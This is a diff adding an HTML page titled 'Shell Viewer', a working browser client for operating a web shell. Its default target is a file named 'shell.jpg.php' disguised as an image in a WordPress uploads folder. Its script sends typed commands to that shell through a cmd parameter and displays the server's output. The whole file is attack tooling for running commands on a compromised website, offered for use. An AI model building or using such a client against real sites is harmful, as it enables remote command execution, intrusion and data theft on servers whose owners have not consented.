@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Shell Viewer</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #0a0e14; color: #b3b1ad; font-family: 'Courier New', monospace; height: 100vh; display: flex; flex-direction: column; padding: 12px; }
+  h1 { color: #e6b450; font-size: 14px; margin-bottom: 8px; }
+  .config { display: flex; gap: 8px; margin-bottom: 8px; }
+  .config input { flex: 1; background: #1a1f29; border: 1px solid #2a2f3a; color: #e6e1cf; padding: 6px 10px; font-family: inherit; font-size: 13px; border-radius: 4px; }
+  .cmd-row { display: flex; gap: 8px; margin-bottom: 8px; }
+  .cmd-row input { flex: 1; background: #1a1f29; border: 1px solid #39bae6; color: #e6e1cf; padding: 8px 10px; font-family: inherit; font-size: 14px; border-radius: 4px; outline: none; }
+  .cmd-row input:focus { border-color: #e6b450; }
+  .cmd-row button { background: #39bae6; color: #0a0e14; border: none; padding: 8px 16px; font-family: inherit; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 13px; }
+  .cmd-row button:hover { background: #e6b450; }
+  #output { flex: 1; background: #0d1117; border: 1px solid #2a2f3a; border-radius: 4px; padding: 10px; overflow: auto; white-space: pre-wrap; word-break: break-all; font-size: 13px; line-height: 1.5; }
+  .history { color: #636a76; font-size: 12px; margin-bottom: 4px; }
+  .history span { color: #39bae6; cursor: pointer; margin-right: 8px; }
+  .history span:hover { color: #e6b450; }
+  .error { color: #f07178; }
+  .prompt { color: #39bae6; }
+  .result { color: #b3b1ad; }
+  .status { color: #636a76; font-size: 12px; margin-top: 4px; }
+</style>
+</head>
+<body>
+
+<h1>🐚 Shell Viewer</h1>
+
+<div class="config">
+  <input type="text" id="target" value="http://www.example.local/wp-content/uploads/2026/05/shell.jpg.php" placeholder="Shell URL (without ?cmd=)">
+  <input type="text" id="param" value="cmd" placeholder="Param" style="max-width:80px">
+</div>
+
+<div class="history" id="history">History: </div>
+
+<div class="cmd-row">
+  <input type="text" id="cmd" placeholder="Enter command..." autofocus>
+  <button onclick="run()">Run</button>
+</div>
+
+<div id="output">Ready. Type a command and press Enter.</div>
+<div class="status" id="status"></div>
+
+<script>
+  const cmdInput = document.getElementById('cmd');
+  const output = document.getElementById('output');
+  const status = document.getElementById('status');
+  const historyDiv = document.getElementById('history');
+  let history = [];
+  let historyIdx = -1;
+
+  cmdInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') run();
+    if (e.key === 'ArrowUp') { e.preventDefault(); if (historyIdx < history.length - 1) { historyIdx++; cmdInput.value = history[history.length - 1 - historyIdx]; } }
+    if (e.key === 'ArrowDown') { e.preventDefault(); if (historyIdx > 0) { historyIdx--; cmdInput.value = history[history.length - 1 - historyIdx]; } else { historyIdx = -1; cmdInput.value = ''; } }
+  });
+
+  function rerun(cmd) { cmdInput.value = cmd; run(); }
+
+  function updateHistory() {
+    const unique = [...new Set(history)].slice(-10);
+    historyDiv.innerHTML = 'History: ' + unique.map(c => `<span onclick="rerun('${c.replace(/'/g, "\\'")}')">${c}</span>`).join('');
+  }
+
+  async function run() {
+    const target = document.getElementById('target').value.trim();
+    const param = document.getElementById('param').value.trim() || 'cmd';
+    const cmd = cmdInput.value.trim();
+    if (!cmd) return;
+
+    history.push(cmd);
+    historyIdx = -1;
+    updateHistory();
+
+    const url = `${target}?${param}=${encodeURIComponent(cmd)}`;
+    output.innerHTML += `\n<span class="prompt">$ ${cmd}</span>\n`;
+    status.textContent = 'Running...';
+
+    try {
+      const res = await fetch(url);
+      const text = await res.text();
+      // Strip JPEG magic bytes (first 4 bytes: ff d8 ff e0) and any leading non-ASCII
+      const clean = text.substring(text.search(/[\x20-\x7E\n\r\t]/)).trim();
+      output.innerHTML += `<span class="result">${escapeHtml(clean)}</span>\n`;
+      status.textContent = `Done (${res.status}) - ${new Date().toLocaleTimeString()}`;
+    } catch (err) {
+      output.innerHTML += `<span class="error">Error: ${escapeHtml(err.message)}</span>\n`;
+      status.textContent = 'Failed';
+    }
+
+    output.scrollTop = output.scrollHeight;
+    cmdInput.value = '';
+    cmdInput.focus();
+  }
+
+  function escapeHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+</script>
+
+</body>
+</html>
